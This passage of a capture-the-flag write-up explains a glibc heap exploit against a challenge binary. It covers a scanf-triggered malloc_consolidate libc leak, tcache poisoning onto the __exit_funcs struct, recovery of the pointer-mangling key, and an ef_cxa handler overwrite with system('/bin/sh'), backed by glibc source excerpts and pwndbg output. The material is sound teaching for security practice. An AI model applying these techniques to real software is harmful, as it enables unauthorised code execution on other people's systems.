<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> MIN_LARGE_SIZE</span><span style="color:#F8F8F2">    ((NSMALLBINS </span><span style="color:#FF79C6">-</span><span style="color:#F8F8F2"> SMALLBIN_CORRECTION) </span><span style="color:#FF79C6">*</span><span style="color:#F8F8F2"> SMALLBIN_WIDTH)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> in_smallbin_range</span><span style="color:#F8F8F2">(</span><span style="color:#FFB86C;font-style:italic">sz</span><span style="color:#F8F8F2">)  </span><span style="color:#FF79C6">\</span></span>
<span class="line"><span style="color:#F8F8F2">  ((</span><span style="color:#FF79C6">unsigned</span><span style="color:#FF79C6"> long</span><span style="color:#F8F8F2">) (sz) </span><span style="color:#FF79C6">&lt;</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">unsigned</span><span style="color:#FF79C6"> long</span><span style="color:#F8F8F2">) MIN_LARGE_SIZE)</span></span></code></pre>
<p>So what happens if we create a chunk bigger than 0x400 bytes? To answer that, we need to understand what <code>malloc_consolidate</code> does.</p>
<div class="callout" data-type="info" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <div class="callout-header" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <span class="callout-icon" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);">üìã</span> <span class="callout-title" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);">Info</span> </div> <div class="callout-content" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <p><code>malloc_consolidate()</code> in glibc is a function that <strong>coalesces</strong> small freed chunks from the fastbins into the <strong>unsortedbin</strong>.
Normally, when a small chunk is freed and doesnt enter tcache, it goes into fastbin without being merged with adjacent free chunks to keep <code>free()</code> fast.
Over time, this can fragment memory. When <code>malloc()</code> needs a lot of space (when allocating a largebin for example) it calls <code>malloc_consolidate()</code></p> </div> </div> 
<p>This means that if we generate a fastbin chunk and trigger in some way <code>malloc_consolidate</code> the generated fastbin chunk gets moved into the <strong>smallbin</strong> even if it‚Äôs a small chunk. Reading this chunk gives us a libc leak.
But as we discovered before, to execute <code>malloc_consolidate</code> we need to allocate a chunk of size 0x400 or greater, this is where our scanf trick comes handy.</p>
<h2 id="putting-it-all-together">Putting it all together.</h2>
<p>We start by generating eight chunks (7 tcache + 1 fastbin) and free them in a particular order to guarantee that the <strong>fastbin chunk</strong> is <strong>not</strong> the last one in heap memory. Else, the fastbin chunk would simply be trimmed by malloc_consolidate.</p>
<p><img src="/_astro/writeup-011.LZi8BA88_Z1EXPTO.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="940" height="263"></p>
<p>Now we can apply the knowledge gotten from scanf and malloc, let‚Äôs allocate a chunk big enough to trigger a <code>malloc</code> in <code>scanf</code>, and greater than the smallbin max size to trigger <code>malloc_consolidate</code>.
To achieve this we can send <code>b&quot;1&quot;*0x500</code> to <code>scanf</code>, this is bigger than <code>0x400</code> so both <code>scratch_buffer_grow_preserve()</code> and <code>malloc_consolidate()</code> get triggered. The <strong>fastbin</strong> chunk gets moved to the <strong>unsortedbin</strong> and then into the <strong>smallbin</strong> list once the big chunk gets freed after scanf got called.</p>
<p><img src="/_astro/writeup-012.fig4Vgia_VDyQi.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="935" height="264"></p>
<p>by using <code>chunk_read()</code> on the first chunk we can leak the libc address!!!!!!!</p>
<h1 id="exploiting-with-exit_func-overwrite">Exploiting with exit_func overwrite</h1>
<p>Looking at the <code>exit()</code> function, we notice that it is only a wrapper around <code>__run_exit_handlers()</code>.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="c"><code><span class="line"><span style="color:#6272A4">//glibc internals</span></span>
<span class="line"><span style="color:#FF79C6">void</span><span style="color:#50FA7B"> exit</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">int</span><span style="color:#FFB86C;font-style:italic"> status</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#50FA7B">  __run_exit_handlers</span><span style="color:#F8F8F2"> (status, </span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2">__exit_funcs, </span><span style="color:#BD93F9">true</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">true</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
<p>This function executes so-called <code>exit_functions</code> saved into the <code>__exit_funcs</code> global structure. Exit functions can also be registered by the user using <code>atexit()</code>.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="c"><code><span class="line"><span style="color:#6272A4">//example snippet</span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &lt;</span><span style="color:#F1FA8C">stdio.h</span><span style="color:#E9F284">&gt;</span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &lt;</span><span style="color:#F1FA8C">stdlib.h</span><span style="color:#E9F284">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">void</span><span style="color:#50FA7B"> cleanup1</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">void</span><span style="color:#F8F8F2">) { </span><span style="color:#50FA7B">puts</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">&quot;</span><span style="color:#F1FA8C">cleanup1</span><span style="color:#E9F284">&quot;</span><span style="color:#F8F8F2">); }</span></span>
<span class="line"><span style="color:#FF79C6">void</span><span style="color:#50FA7B"> cleanup2</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">void</span><span style="color:#F8F8F2">) { </span><span style="color:#50FA7B">puts</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">&quot;</span><span style="color:#F1FA8C">cleanup2</span><span style="color:#E9F284">&quot;</span><span style="color:#F8F8F2">); }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> main</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">void</span><span style="color:#F8F8F2">) {</span></span>
<span class="line"><span style="color:#50FA7B">    atexit</span><span style="color:#F8F8F2">(cleanup1);</span></span>
<span class="line"><span style="color:#50FA7B">    atexit</span><span style="color:#F8F8F2">(cleanup2);</span></span>
<span class="line"><span style="color:#50FA7B">    printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">&quot;</span><span style="color:#F1FA8C">Exiting...</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">&quot;</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#FF79C6">    return</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4"> // triggers cleanup2 then cleanup1</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
<p>So, what exactly is an <em>exit_function</em>?<br/>
Looking at the code below, we can see that an <code>exit_function</code> is a <strong>struct</strong> that <strong>wraps a function call</strong>. The <code>flavor</code> field indicates that there are multiple types of exit functions that take different combinations of arguments.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="c"><code><span class="line"><span style="color:#6272A4">//glibc internals</span></span>
<span class="line"><span style="color:#FF79C6">struct</span><span style="color:#F8F8F2"> exit_function</span></span>
<span class="line"><span style="color:#F8F8F2">  {</span></span>
<span class="line"><span style="color:#FF79C6">    long</span><span style="color:#FF79C6"> int</span><span style="color:#F8F8F2"> flavor;</span></span>
<span class="line"><span style="color:#FF79C6">    union</span></span>
<span class="line"><span style="color:#F8F8F2">    {</span></span>
<span class="line"><span style="color:#FF79C6">		void</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">*</span><span style="color:#F8F8F2">at) (</span><span style="color:#FF79C6">void</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#FF79C6">		struct</span></span>
<span class="line"><span style="color:#F8F8F2">		{</span></span>
<span class="line"><span style="color:#FF79C6">		    void</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">*</span><span style="color:#F8F8F2">fn) (</span><span style="color:#FF79C6">int</span><span style="color:#F8F8F2"> status, </span><span style="color:#FF79C6">void</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">arg);</span></span>
<span class="line"><span style="color:#FF79C6">		    void</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">arg;</span></span>
<span class="line"><span style="color:#F8F8F2">		} on;</span></span>
<span class="line"><span style="color:#FF79C6">		struct</span></span>
<span class="line"><span style="color:#F8F8F2">		{</span></span>
<span class="line"><span style="color:#FF79C6">		    void</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">*</span><span style="color:#F8F8F2">fn) (</span><span style="color:#FF79C6">void</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">arg, </span><span style="color:#FF79C6">int</span><span style="color:#F8F8F2"> status);</span></span>
<span class="line"><span style="color:#FF79C6">		    void</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">arg;</span></span>
<span class="line"><span style="color:#FF79C6">		    void</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">dso_handle;</span></span>
<span class="line"><span style="color:#F8F8F2">		} cxa;</span></span>
<span class="line"><span style="color:#F8F8F2">    } func;</span></span>
<span class="line"><span style="color:#F8F8F2">  };</span></span></code></pre>
<p>Looking at the snippet <code>run_exit_handlers()</code> below we can see how the flavors change the execution of an exit function:</p>
<ul>
<li><strong>ef_free</strong>: slot is dead, ignore</li>
<li><strong>ef_us</strong>: nothing happens</li>
<li><strong>ef_on</strong>: status code as first argument and user supplied argument as second one</li>
<li><strong>ef_at</strong>: function without arguments</li>
<li><strong>ef_cxa</strong>: the important one, <strong>first argument is user supplied</strong> and second one is the status code.</li>
</ul>
<div class="callout" data-type="info" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <div class="callout-header" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <span class="callout-icon" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);">üìã</span> <span class="callout-title" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);">Info</span> </div> <div class="callout-content" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <p>By looking at the example above you can notice that <code>atexit()</code> only registers <strong>ef_at</strong> functions, if you want to register <strong>ef_on</strong> functions there is a GNU extensions that implements <code>on_exit()</code>.</p> </div> </div> 
<p><strong>Question:</strong> Why is <code>ef_cxa</code> the best flavor?
<strong>Answer:</strong> We can overwrite the function pointer with <code>system()</code> and set the first argument as <code>/bin/sh</code></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="c"><code><span class="line"><span style="color:#6272A4">//glibc internals</span></span>
<span class="line"><span style="color:#50FA7B">__run_exit_handlers</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">int</span><span style="color:#FFB86C;font-style:italic"> status</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">struct</span><span style="color:#F8F8F2"> exit_function_list </span><span style="color:#FF79C6">**</span><span style="color:#FFB86C;font-style:italic">listp</span><span style="color:#F8F8F2">,</span></span>
<span class="line"><span style="color:#FF79C6">			bool</span><span style="color:#FFB86C;font-style:italic"> run_list_atexit</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">bool</span><span style="color:#FFB86C;font-style:italic"> run_dtors</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F8F8F2">...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">while</span><span style="color:#F8F8F2"> (cur</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">idx </span><span style="color:#FF79C6">&gt;</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">	{</span></span>
<span class="line"><span style="color:#FF79C6">	struct</span><span style="color:#F8F8F2"> exit_function </span><span style="color:#FF79C6">*const</span><span style="color:#F8F8F2"> f </span><span style="color:#FF79C6">=</span><span style="color:#FF79C6"> &amp;</span><span style="color:#F8F8F2">cur</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">fns[</span><span style="color:#FF79C6">--</span><span style="color:#F8F8F2">cur</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">idx];</span></span>
<span class="line"><span style="color:#FF79C6">	const</span><span style="color:#FF79C6"> uint64_t</span><span style="color:#F8F8F2"> new_exitfn_called </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> __new_exitfn_called;</span></span>
<span class="line"><span style="color:#F8F8F2">	</span></span>
<span class="line"><span style="color:#50FA7B">	__libc_lock_unlock</span><span style="color:#F8F8F2"> (__exit_funcs_lock);</span></span>
<span class="line"><span style="color:#FF79C6">	switch</span><span style="color:#F8F8F2"> (f</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">flavor)</span></span>
<span class="line"><span style="color:#F8F8F2">	{</span></span>
<span class="line"><span style="color:#FF79C6">		void</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">*</span><span style="color:#F8F8F2">atfct) (</span><span style="color:#FF79C6">void</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#FF79C6">		void</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">*</span><span style="color:#F8F8F2">onfct) (</span><span style="color:#FF79C6">int</span><span style="color:#F8F8F2"> status, </span><span style="color:#FF79C6">void</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">arg);</span></span>
<span class="line"><span style="color:#FF79C6">		void</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">*</span><span style="color:#F8F8F2">cxafct) (</span><span style="color:#FF79C6">void</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">arg, </span><span style="color:#FF79C6">int</span><span style="color:#F8F8F2"> status);</span></span>
<span class="line"><span style="color:#F8F8F2">		</span></span>
<span class="line"><span style="color:#FF79C6">		case</span><span style="color:#F8F8F2"> ef_free:</span></span>
<span class="line"><span style="color:#FF79C6">		case</span><span style="color:#F8F8F2"> ef_us:</span></span>
<span class="line"><span style="color:#FF79C6">			break</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#FF79C6">	    case</span><span style="color:#F8F8F2"> ef_on:</span></span>
<span class="line"><span style="color:#F8F8F2">			onfct </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> f</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">func.on.fn;</span></span>
<span class="line"><span style="color:#50FA7B">			onfct</span><span style="color:#F8F8F2"> (status, f</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">func.on.arg);</span></span>
<span class="line"><span style="color:#FF79C6">			break</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#FF79C6">	    case</span><span style="color:#F8F8F2"> ef_at:</span></span>
<span class="line"><span style="color:#F8F8F2">			atfct </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> f</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">func.at;</span></span>
<span class="line"><span style="color:#50FA7B">			atfct</span><span style="color:#F8F8F2"> ();</span></span>
<span class="line"><span style="color:#FF79C6">			break</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#FF79C6">	    case</span><span style="color:#F8F8F2"> ef_cxa:</span></span>
<span class="line"><span style="color:#F8F8F2">			f</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">flavor </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> ef_free;</span></span>
<span class="line"><span style="color:#F8F8F2">			cxafct </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> f</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">func.cxa.fn;</span></span>
<span class="line"><span style="color:#50FA7B">			cxafct</span><span style="color:#F8F8F2"> (f</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">func.cxa.arg, status);</span><span style="color:#6272A4"> // &lt;-- cxa is executed here </span></span>
<span class="line"><span style="color:#FF79C6">			break</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#F8F8F2">	}</span></span>
<span class="line"><span style="color:#50FA7B">	  __libc_lock_lock</span><span style="color:#F8F8F2"> (__exit_funcs_lock);</span></span>
<span class="line"><span style="color:#FF79C6">	  if</span><span style="color:#F8F8F2"> (</span><span style="color:#50FA7B">__glibc_unlikely</span><span style="color:#F8F8F2"> (new_exitfn_called </span><span style="color:#FF79C6">!=</span><span style="color:#F8F8F2"> __new_exitfn_called))</span></span>
<span class="line"><span style="color:#FF79C6">	    goto</span><span style="color:#F8F8F2"> restart;</span></span>
<span class="line"><span style="color:#F8F8F2">	}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F8F8F2">...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
<h2 id="putting-it-all-together-1">Putting it all together</h2>
<p>In practice, we are going to inspect the <strong>exit handler array entries</strong>, look for an exit handler with <code>flavor == 4 (ef_cxa)</code> to overwrite with a pointer to <code>system()</code>, and then set <code>/bin/sh</code> as its first argument. Getting a shell from there is as easy as executing the binary and exiting.</p>
<h3 id="step-1-getting-the-__exit_funcs-struct">Step 1: Getting the __exit_funcs struct</h3>
<p>Using our <em>libc leak</em> obtained before, we get the <code>__exit_funcs</code> struct by summing the offset of the struct with the libc base address. libc uses the symbol <code>initial</code> to point at the exit_funcs, if needed, bigger arrays can be generated to extend the number of exit functions that can be registered, this one is the initial array that always exists:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F8F8F2">__exit_funcs </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> libc_base </span><span style="color:#FF79C6">+</span><span style="color:#F8F8F2"> libc.symbols.initial</span></span></code></pre>
<p>We then overwrite the first <strong>tcache forward pointer</strong> with this address, remember that when malloc is called the first 16 bytes get zeroed out.
After calling <code>malloc()</code> twice, the second call will return a pointer to the <code>initial</code> struct, now we can edit and read from it.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F8F8F2">pwndbg</span><span style="color:#FF79C6">&gt;</span><span style="color:#F8F8F2"> tele </span><span style="color:#FF79C6">0x</span><span style="color:#BD93F9">7f3046204fc0</span><span style="color:#FF79C6"> &lt;--</span><span style="color:#F8F8F2"> libc_base </span><span style="color:#FF79C6">+</span><span style="color:#F8F8F2"> initial offset</span></span>
<span class="line"><span style="color:#FF79C6">0</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">:</span><span style="color:#FF79C6">0</span><span style="color:#BD93F9">000</span><span style="color:#F8F8F2">‚îÇ  </span><span style="color:#FF79C6">0x</span><span style="color:#BD93F9">7f3046204fc0</span><span style="color:#F8F8F2"> (initial) ‚óÇ‚Äî </span><span style="color:#BD93F9">0</span></span>
<span class="line"><span style="color:#FF79C6">0</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">:</span><span style="color:#BD93F9">0008</span><span style="color:#F8F8F2">‚îÇ  </span><span style="color:#FF79C6">0x</span><span style="color:#BD93F9">7f3046204fc8</span><span style="color:#F8F8F2"> (initial</span><span style="color:#FF79C6">+</span><span style="color:#BD93F9">8</span><span style="color:#F8F8F2">) ‚óÇ‚Äî </span><span style="color:#BD93F9">1</span><span style="color:#FF79C6"> &lt;--</span><span style="color:#F8F8F2"> number of registered funcs</span></span>
<span class="line"><span style="color:#FF79C6">0</span><span style="color:#BD93F9">2</span><span style="color:#F8F8F2">:</span><span style="color:#FF79C6">0</span><span style="color:#BD93F9">010</span><span style="color:#F8F8F2">‚îÇ  </span><span style="color:#FF79C6">0x</span><span style="color:#BD93F9">7f3046204fd0</span><span style="color:#F8F8F2"> (initial</span><span style="color:#FF79C6">+</span><span style="color:#BD93F9">16</span><span style="color:#F8F8F2">) ‚óÇ‚Äî </span><span style="color:#BD93F9">4</span><span style="color:#FF79C6"> &lt;--</span><span style="color:#F8F8F2"> flavor</span></span>
<span class="line"><span style="color:#FF79C6">0</span><span style="color:#BD93F9">3</span><span style="color:#F8F8F2">:</span><span style="color:#BD93F9">0018</span><span style="color:#F8F8F2">‚îÇ  </span><span style="color:#FF79C6">0x</span><span style="color:#BD93F9">7f3046204fd8</span><span style="color:#F8F8F2"> (initial</span><span style="color:#FF79C6">+</span><span style="color:#BD93F9">24</span><span style="color:#F8F8F2">) ‚óÇ‚Äî </span><span style="color:#FF79C6">0x</span><span style="color:#BD93F9">91b97d6d433887e0</span><span style="color:#FF79C6"> &lt;--</span><span style="color:#F8F8F2"> function addrs</span></span>
<span class="line"><span style="color:#FF79C6">0</span><span style="color:#BD93F9">4</span><span style="color:#F8F8F2">:</span><span style="color:#FF79C6">0</span><span style="color:#BD93F9">020</span><span style="color:#F8F8F2">‚îÇ  </span><span style="color:#FF79C6">0x</span><span style="color:#BD93F9">7f3046204fe0</span><span style="color:#F8F8F2"> (initial</span><span style="color:#FF79C6">+</span><span style="color:#BD93F9">32</span><span style="color:#F8F8F2">) ‚óÇ‚Äî </span><span style="color:#BD93F9">0</span><span style="color:#FF79C6"> &lt;--</span><span style="color:#F8F8F2"> argument</span></span>
<span class="line"><span style="color:#F8F8F2">... ‚Üì     </span><span style="color:#BD93F9">3</span><span style="color:#F8F8F2"> skipped</span></span></code></pre>
<p>Looking at the output from pwndbg above, we notice only one entry in the array, fortunately this is a <code>ef_cxa</code> entry, now we only need to replace it with the <code>system()</code> function.</p>
<h3 id="step-2-replacing-function-with-system">Step 2: Replacing function with system()</h3>
<p>Do you notice something wrong with the function address in the snipped above? That‚Äôs <strong>not</strong> an address. When an atexit function gets registered, its address is xored with a key called <strong>pointer_chk_guard</strong> and then rotated left by 17 bits (0x11).</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>mangled</mtext><mi mathvariant="normal">_</mi><mtext>address</mtext><mo>=</mo><mtext mathvariant="monospace">rol</mtext><mo stretchy="false">(</mo><mtext>address</mtext><mo>‚äï</mo><mtext>¬†key</mtext><mo separator="true">,</mo><mtext>0x11</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{mangled}\_\text{address} = \texttt{rol}(\text{address} \oplus\ \text{key} , \text{0x11})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em"></span><span class="mord text"><span class="mord">mangled</span></span><span class="mord" style="margin-right:0.02778em">_</span><span class="mord text"><span class="mord">address</span></span><span class="mspace" style="margin-right:0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mord text"><span class="mord texttt">rol</span></span><span class="mopen">(</span><span class="mord text"><span class="mord">address</span></span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">‚äï</span><span class="mspace">¬†</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mord text"><span class="mord">key</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em"></span><span class="mord text"><span class="mord">0x11</span></span><span class="mclose">)</span></span></span></span></span>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>address</mtext><mo>=</mo><mtext mathvariant="monospace">ror</mtext><mo stretchy="false">(</mo><mtext>mangled</mtext><mi mathvariant="normal">_</mi><mtext>address</mtext><mo separator="true">,</mo><mtext>0x11</mtext><mo stretchy="false">)</mo><mtext>¬†</mtext><mo>‚äï</mo><mtext>¬†key</mtext></mrow><annotation encoding="application/x-tex">\text{address} = \texttt{ror}(\text{mangled}\_\text{address}, \text{0x11})\ \oplus\ \text{key}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em"></span><span class="mord text"><span class="mord">address</span></span><span class="mspace" style="margin-right:0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em"></span><span class="mord text"><span class="mord texttt">ror</span></span><span class="mopen">(</span><span class="mord text"><span class="mord">mangled</span></span><span class="mord" style="margin-right:0.02778em">_</span><span class="mord text"><span class="mord">address</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em"></span><span class="mord text"><span class="mord">0x11</span></span><span class="mclose">)</span><span class="mspace">¬†</span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">‚äï</span><span class="mspace">¬†</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em"></span><span class="mord text"><span class="mord">key</span></span></span></span></span></span>
<p>But by performing a <code>ROR</code> (rotate right) by 0x11 bits on the mangled address and then <code>XOR</code>ing the result with the real address, we can easily recover the key.</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>key</mtext><mo>=</mo><mtext mathvariant="monospace">ror</mtext><mo stretchy="false">(</mo><mtext>mangled</mtext><mi mathvariant="normal">_</mi><mtext>address</mtext><mo separator="true">,</mo><mtext>0x11</mtext><mo stretchy="false">)</mo><mtext>¬†</mtext><mo>‚äï</mo><mtext>¬†address</mtext></mrow><annotation encoding="application/x-tex">\text{key} = \texttt{ror}(\text{mangled}\_\text{address}, \text{0x11})\ \oplus \ \text{address}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em"></span><span class="mord text"><span class="mord">key</span></span><span class="mspace" style="margin-right:0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em"></span><span class="mord text"><span class="mord texttt">ror</span></span><span class="mopen">(</span><span class="mord text"><span class="mord">mangled</span></span><span class="mord" style="margin-right:0.02778em">_</span><span class="mord text"><span class="mord">address</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em"></span><span class="mord text"><span class="mord">0x11</span></span><span class="mclose">)</span><span class="mspace">¬†</span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">‚äï</span><span class="mspace">¬†</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.6944em"></span><span class="mord text"><span class="mord">address</span></span></span></span></span></span>
<p>Once we have the key, we can replace the old mangled function address with the mangled  <code>system()</code> address and overwrite the argument <code>0</code> with <code>/bin/sh\0</code>.</p>
<p>But how do we get the unmangled address to recover the key?<br/>
Set a breakpoint at <code>exit()</code> and let the program hit it, then step till you find the <code>ROR</code> and <code>XOR</code> instructions. After the runtime demangles the function pointer you can read the real pointer.
Unfortunately, in our case the registered functions position is <strong>not</strong> relative to <code>libc</code> but to the dynamic loader (<code>ld</code>). Fortunately, the <code>libc</code> contains pointers into the loader mapping, so you can find those with <code>p2p libc ld</code> and use them to resolve the loader base.</p>
<p><img src="/_astro/writeup-018.Dz_i3sUl_Z1JMJ9O.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="1367" height="461"></p>
<p>Using the same tcache poisoning technique we applied to read and modify the exit function array, we can also leak the loader‚Äôs address.<br/>
We‚Äôll use the last pointer in the output from <code>p2p</code>, since <code>malloc()</code> writes directly into the allocated area before being able to read meaning we need a writable leak.<br/>
Once again, we overwrite the first tcache chunk‚Äôs forward pointer with this address, allocate two chunks, and then read from the second one to obtain the loader leak.</p>
